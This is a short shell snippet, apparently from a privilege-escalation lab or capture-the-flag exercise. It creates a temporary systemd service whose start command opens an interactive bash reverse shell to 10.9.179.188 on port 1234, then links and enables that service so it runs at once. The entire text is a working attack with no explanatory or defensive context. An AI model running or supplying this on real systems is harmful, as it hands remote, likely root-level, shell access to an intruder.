TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i > & /dev/tcp/10.9.179.188/1234 0>&1"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
